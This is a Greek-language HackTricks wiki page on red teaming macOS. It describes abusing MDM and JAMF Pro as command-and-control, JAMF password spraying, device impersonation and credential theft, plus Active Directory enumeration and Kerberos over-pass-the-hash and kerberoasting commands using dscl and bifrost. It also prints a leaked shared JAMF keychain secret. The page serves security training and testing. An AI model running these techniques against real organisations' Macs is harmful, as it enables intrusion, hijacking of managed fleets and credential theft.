# Red Teaming σε macOS

{{#include ../../banners/hacktricks-training.md}}


## Κατάχρηση MDM

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Αν καταφέρετε να **παραβιάσετε διαπιστευτήρια διαχειριστή** για να αποκτήσετε πρόσβαση στην πλατφόρμα διαχείρισης, μπορείτε **ενδεχομένως να παραβιάσετε όλους τους υπολογιστές**, διανέμοντας το malware στα μηχανήματα.

Για red teaming σε περιβάλλοντα MacOS, συνιστάται ιδιαίτερα να κατανοείτε σε κάποιον βαθμό πώς λειτουργούν τα MDM:


{{#ref}}
macos-mdm/
{{#endref}}

### Χρήση MDM ως C2

Ένα MDM θα έχει δικαιώματα εγκατάστασης, αναζήτησης ή αφαίρεσης προφίλ, εγκατάστασης εφαρμογών, δημιουργίας τοπικών λογαριασμών διαχειριστή, ορισμού κωδικού firmware, αλλαγής του κλειδιού FileVault...

Για να εκτελέσετε το δικό σας MDM, πρέπει να **υπογράψει ένας προμηθευτής το CSR σας**. Μπορείτε να δοκιμάσετε να το αποκτήσετε μέσω του [**https://mdmcert.download/**](https://mdmcert.download/). Για να εκτελέσετε το δικό σας MDM για συσκευές Apple, μπορείτε να χρησιμοποιήσετε το [**MicroMDM**](https://github.com/micromdm/micromdm).

Η εγγραφή σε MDM **δεν** καθιστά αυτόματα το πιστοποιητικό TLS του διακομιστή διαχείρισης έμπιστη CA ούτε χορηγεί ταυτότητα υπογραφής εφαρμογών. Αν ο διακομιστής χρησιμοποιεί ιδιωτική CA, τα πιστοποιητικά ρίζας και ενδιάμεσων CA πρέπει να παρέχονται στο προφίλ εγγραφής ή σε ξεχωριστό προφίλ εμπιστοσύνης. Το πιστοποιητικό ταυτότητας πελάτη που χρησιμοποιείται για τον έλεγχο ταυτότητας MDM είναι διαφορετικό.<sup>[[7]](#references)</sup>

Ένα ληφθέν προφίλ εγγραφής MDM (`.mobileconfig`) πρέπει να ανοιχτεί και να εγκριθεί στις **Ρυθμίσεις συστήματος → Γενικά → Διαχείριση συσκευών**. Η απλή τοποθέτησή του σε ένα `.pkg` που εγκαθίσταται ως root ή σε ένα ZIP που ανοίγεται με το Safari δεν εγγράφει αθόρυβα έναν σύγχρονο Mac. Δείτε τη [συμπεριφορά των προφίλ διαμόρφωσης](../macos-auto-start-locations.md#configuration-profiles-mobileconfig).<sup>[[8]](#references)</sup>

Η Αυτοματοποιημένη Εγγραφή Συσκευής κατά τη διάρκεια του Setup Assistant είναι ξεχωριστή διαδικασία. Δείτε την [παράνομη εγγραφή συσκευής άλλου οργανισμού](macos-mdm/enrolling-devices-in-other-organisations.md) για τις διαφορετικές προϋποθέσεις της.<sup>[[9]](#references)</sup>

Ο **agent Orthrus του Mythic** χρησιμοποιεί αυτή την τεχνική.

### Ανάπτυξη πακέτου μέσω ελεγχόμενου MDM

Σε έναν **επιτηρούμενο Mac με macOS 26 ή νεότερη έκδοση**, ο έλεγχος της υπηρεσίας MDM επιτρέπει μια δήλωση `com.apple.configuration.package` στο πεδίο εφαρμογής του συστήματος.<sup>[[10]](#references)</sup> Το πακέτο πρέπει να έχει υπογραφή που μπορεί να επαληθεύσει η συσκευή, αλλά η εφαρμογή του δεν χρειάζεται ξεχωριστή υπογραφή Developer ID: το Gatekeeper δεν ελέγχει εφαρμογές που εγκαθίστανται μέσω διαχείρισης συσκευών.<sup>[[11]](#references)</sup> Ένα έμπιστο πιστοποιητικό TLS διακομιστή από μόνο του δεν δίνει στον χειριστή το ιδιωτικό κλειδί ή τη δυνατότητα υπογραφής που απαιτείται για την υπογραφή αυτού του πακέτου.<sup>[[11]](#references)[[12]](#references)</sup>

Δημιουργήστε ένα υπογεγραμμένο δοκιμαστικό πακέτο, υπολογίστε το digest του και δημοσιεύστε μέσω HTTPS τόσο το πακέτο όσο και ένα plist `ManifestURL`. Το manifest χρειάζεται ένα asset `software-package` με το URL και το SHA-256 του, καθώς και ένα μοναδικό `bundle-identifier` και `bundle-version`.<sup>[[11]](#references)</sup> Έπειτα, στείλτε μια δήλωση πακέτου με το URL του manifest και το `InstallBehavior.Install` ορισμένο σε `Required`. Ελέγξτε το στοιχείο κατάστασης `package.list` για την εγκατάσταση ή τυχόν σφάλματα.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
pkgbuild --component ./Test.app --install-location /Applications --sign "Package Signing Certificate" ./Test.pkg
shasum -a 256 ./Test.pkg
```

Μια ελάχιστη δήλωση απαιτούμενης εγκατάστασης, που υποβάλλεται μέσω της υπηρεσίας MDM, έχει την εξής μορφή (αντικαταστήστε το URL και τα δύο UUID).<sup>[[10]](#references)</sup>

```json
{
  "Type": "com.apple.configuration.package",
  "Identifier": "11111111-1111-4111-8111-111111111111",
  "ServerToken": "22222222-2222-4222-8222-222222222222",
  "Payload": {
    "ManifestURL": "https://mdm.example.org/TestPackage.plist",
    "InstallBehavior": {"Install": "Required"}
  }
}
```

### Κατάχρηση του JAMF PRO

Το JAMF μπορεί να εκτελεί **custom scripts** (scripts που αναπτύσσει ο sysadmin), **native payloads** (δημιουργία τοπικού λογαριασμού, ορισμός κωδικού EFI, παρακολούθηση αρχείων/διεργασιών...) και **MDM** (διαμορφώσεις συσκευών, πιστοποιητικά συσκευών...).<sup>[[5]](#references)</sup>

#### Αυτοεγγραφή στο JAMF

Μεταβείτε σε μια σελίδα όπως η `https://<company-name>.jamfcloud.com/enroll/` για να δείτε αν έχουν ενεργοποιήσει την **αυτοεγγραφή**. Αν την έχουν ενεργοποιήσει, μπορεί να **ζητήσει διαπιστευτήρια για πρόσβαση**.

Μπορείτε να χρησιμοποιήσετε το script [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) για να εκτελέσετε επίθεση password spraying.

Επιπλέον, αφού βρείτε έγκυρα διαπιστευτήρια, ίσως μπορέσετε να κάνετε brute-force σε άλλα ονόματα χρήστη με την ακόλουθη φόρμα:

![Κατάχρηση του JAMF PRO - Αυτοεγγραφή στο JAMF: Επιπλέον, αφού βρείτε έγκυρα διαπιστευτήρια, ίσως μπορέσετε να κάνετε brute-force σε άλλα ονόματα χρήστη με την ακόλουθη φόρμα](<../../images/image (107).png>)

#### Πιστοποίηση συσκευών JAMF

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

Το εκτελέσιμο **`jamf`** περιείχε το μυστικό για το άνοιγμα του keychain, το οποίο τη στιγμή της ανακάλυψης ήταν **κοινόχρηστο** από όλους και ήταν: **`jk23ucnq91jfu9aj`**.<sup>[[5]](#references)</sup>\
Επιπλέον, το jamf παραμένει ως **LaunchDaemon** στο **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### Κατάληψη συσκευής JAMF

Το **URL** του **JSS** (Jamf Software Server) που θα χρησιμοποιήσει το **`jamf`** βρίσκεται στο **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Αυτό το αρχείο περιέχει ουσιαστικά το URL:

```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
	<key>is_virtual_machine</key>
	<false/>
	<key>jss_url</key>
	<string>https://subdomain-company.jamfcloud.com/</string>
	<key>last_management_framework_change_id</key>
	<integer>4</integer>
[...]
```

Έτσι, ένας επιτιθέμενος θα μπορούσε να τοποθετήσει ένα κακόβουλο πακέτο (`pkg`) που **αντικαθιστά αυτό το αρχείο** κατά την εγκατάσταση, ορίζοντας ως **URL έναν Mythic C2 listener για agent Typhon**, ώστε να μπορεί πλέον να καταχραστεί το JAMF ως C2.

```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```

#### JAMF Impersonation

Για να **πλαστογραφήσετε την επικοινωνία** μεταξύ μιας συσκευής και του JMF, χρειάζεστε:

- Το **UUID** της συσκευής: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- Το **JAMF keychain** από: `/Library/Application\ Support/Jamf/JAMF.keychain`, το οποίο περιέχει το πιστοποιητικό της συσκευής

Με αυτές τις πληροφορίες, **δημιουργήστε ένα VM** με το **κλεμμένο** Hardware **UUID** και με απενεργοποιημένο **SIP**, τοποθετήστε το **JAMF keychain**, κάντε **hook** στον Jamf **agent** και κλέψτε τις πληροφορίες του.

#### Κλοπή secrets

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Θα μπορούσατε επίσης να παρακολουθείτε τη διαδρομή `/Library/Application Support/Jamf/tmp/` για **custom scripts** που οι διαχειριστές ενδέχεται να θέλουν να εκτελέσουν μέσω Jamf, καθώς **τοποθετούνται εδώ, εκτελούνται και αφαιρούνται**. Αυτά τα scripts **ενδέχεται να περιέχουν διαπιστευτήρια**.

Ωστόσο, **διαπιστευτήρια** ενδέχεται να μεταβιβάζονται σε αυτά τα scripts ως **παράμετροι**, οπότε θα πρέπει να παρακολουθείτε το `ps aux | grep -i jamf` (χωρίς καν να είστε root).

Το script [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) μπορεί να ακούει για την προσθήκη νέων αρχείων και νέα ορίσματα διεργασιών.

### Απομακρυσμένη πρόσβαση στο macOS

Και επίσης σχετικά με τα «ειδικά» **network protocols** του **MacOS**:


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

Σε ορισμένες περιπτώσεις θα διαπιστώσετε ότι ο υπολογιστής **MacOS είναι συνδεδεμένος σε ένα AD**. Σε αυτό το σενάριο, θα πρέπει να προσπαθήσετε να κάνετε **enumerate** στο Active Directory όπως έχετε συνηθίσει. Βρείτε λίγη **βοήθεια** στις ακόλουθες σελίδες:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Ένα **τοπικό εργαλείο MacOS** που μπορεί επίσης να σας βοηθήσει είναι το `dscl`:

```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```

Υπάρχουν επίσης ορισμένα εργαλεία για MacOS, τα οποία αυτοματοποιούν το enumerate του AD και την αλληλεπίδραση με το kerberos:

- [**Machound**](https://github.com/XMCyber/MacHound): Το MacHound είναι επέκταση του εργαλείου auditing Bloodhound, που επιτρέπει τη συλλογή και εισαγωγή σχέσεων του Active Directory από hosts MacOS.<sup>[[2]](#references)</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Το Bifrost είναι ένα project Objective-C σχεδιασμένο για αλληλεπίδραση με τα Heimdal krb5 APIs στο macOS. Στόχος του project είναι να διευκολύνει τις δοκιμές ασφάλειας γύρω από το Kerberos σε συσκευές macOS, χρησιμοποιώντας native APIs χωρίς να απαιτείται οποιοδήποτε άλλο framework ή package στο target.
- [**Orchard**](https://github.com/its-a-feature/Orchard): Εργαλείο JavaScript for Automation (JXA) για enumeration του Active Directory.

### Πληροφορίες Domain

```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```

### Χρήστες

Οι τρεις τύποι χρηστών του MacOS είναι:

- **Τοπικοί χρήστες** — Διαχειρίζονται από την τοπική υπηρεσία OpenDirectory και δεν συνδέονται με κανέναν τρόπο με το Active Directory.
- **Χρήστες δικτύου** — Παροδικοί χρήστες του Active Directory, οι οποίοι απαιτούν σύνδεση με τον διακομιστή DC για έλεγχο ταυτότητας.
- **Κινητοί χρήστες** — Χρήστες του Active Directory με τοπικό αντίγραφο ασφαλείας των διαπιστευτηρίων και των αρχείων τους.

Οι τοπικές πληροφορίες για τους χρήστες και τις ομάδες αποθηκεύονται στον φάκελο _/var/db/dslocal/nodes/Default._\
Για παράδειγμα, οι πληροφορίες για τον χρήστη _mark_ αποθηκεύονται στο _/var/db/dslocal/nodes/Default/users/mark.plist_ και οι πληροφορίες για την ομάδα _admin_ βρίσκονται στο _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Εκτός από τη χρήση των ακμών HasSession και AdminTo, το **MacHound προσθέτει τρεις νέες ακμές** στη βάση δεδομένων του Bloodhound:<sup>[[2]](#references)</sup>

- **CanSSH** - οντότητα που επιτρέπεται να συνδεθεί μέσω SSH στον host
- **CanVNC** - οντότητα που επιτρέπεται να συνδεθεί μέσω VNC στον host
- **CanAE** - οντότητα που επιτρέπεται να εκτελεί scripts AppleEvent στον host

```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```

Περισσότερες πληροφορίες στο [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)<sup>[[3]](#references)[[6]](#references)</sup>

### Κωδικός πρόσβασης Computer$

Λάβετε κωδικούς πρόσβασης χρησιμοποιώντας:

```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```

Είναι δυνατό να αποκτήσετε πρόσβαση στον κωδικό πρόσβασης του **`Computer$`** μέσα στο keychain του System.

### Over-Pass-The-Hash

Λάβετε ένα TGT για έναν συγκεκριμένο χρήστη και υπηρεσία:

```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
       --hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```

Μόλις συλλεχθεί το TGT, μπορείτε να το κάνετε inject στην τρέχουσα συνεδρία με:

```bash
bifrost --action asktgt --username test_lab_admin \
       --hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
       --enctype aes256 --domain test.lab.local
```

### Kerberoasting

```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
       --username [user] --hash [hash] --enctype [enctype]
```

Με τα service tickets που αποκτήθηκαν, είναι δυνατή η απόπειρα πρόσβασης σε shares άλλων υπολογιστών:

```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```

## Πρόσβαση στο Keychain

Το Keychain πιθανότατα περιέχει ευαίσθητες πληροφορίες, οι οποίες, αν αποκτηθεί πρόσβαση σε αυτές χωρίς να εμφανιστεί prompt, θα μπορούσαν να βοηθήσουν στην πρόοδο μιας άσκησης Red Team:


{{#ref}}
macos-keychain.md
{{#endref}}

## Εξωτερικές υπηρεσίες

Το MacOS Red Teaming διαφέρει από το συνηθισμένο Windows Red Teaming, καθώς συνήθως **το MacOS είναι απευθείας ενσωματωμένο με διάφορες εξωτερικές πλατφόρμες**. Μια συνηθισμένη διαμόρφωση του MacOS είναι η πρόσβαση στον υπολογιστή με **συγχρονισμένα διαπιστευτήρια OneLogin και η πρόσβαση σε διάφορες εξωτερικές υπηρεσίες** (όπως github, aws...) μέσω του OneLogin.

## Διάφορες τεχνικές Red Team

### Safari

Όταν γίνεται λήψη ενός αρχείου στο Safari, αν είναι «ασφαλές», **ανοίγει αυτόματα**. Για παράδειγμα, αν **κάνετε λήψη ενός zip**, θα αποσυμπιεστεί αυτόματα:<sup>[[1]](#references)</sup>

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>



## References

- [1] [Μαζεύοντας μήλα: Red Teaming περιβάλλοντος MacOS το 2021 - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Παρουσιάζουμε το MacHound: Μια λύση για επιθέσεις σε macOS Active Directory](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Εντολές απαρίθμησης domain (ισοδύναμα των dscl / net / ldapsearch)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Ελάτε στη σκοτεινή πλευρά, έχουμε μήλα: Μετατρέποντας τη διαχείριση macOS σε κακόβουλη](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: «Η οπτική των επιτιθέμενων στις διαμορφώσεις Jamf» - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)
- [6] [Ανακάλυψη Active Directory με Mac - its-a-feature](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)
- [7] [Apple — Διαχείριση πιστοποιητικών για υπηρεσίες και συσκευές διαχείρισης συσκευών](https://developer.apple.com/documentation/devicemanagement/managing-certificates-for-device-management-services-and-devices)
- [8] [Apple — Χρήση configuration profiles σε Mac](https://support.apple.com/en-gb/guide/mac-help/mh35561/mac)
- [9] [Apple — Ανάπτυξη προφίλ εγγραφής στη διαχείριση συσκευών](https://developer.apple.com/documentation/devicemanagement/deploying-device-management-enrollment-profiles)
- [10] [Apple — Δήλωση πακέτου](https://developer.apple.com/documentation/devicemanagement/package)
- [11] [Apple — Εγκατάσταση πακέτων](https://developer.apple.com/documentation/devicemanagement/installing-packages)
- [12] [Apple — Ταυτότητες](https://developer.apple.com/documentation/security/identities)
{{#include ../../banners/hacktricks-training.md}}
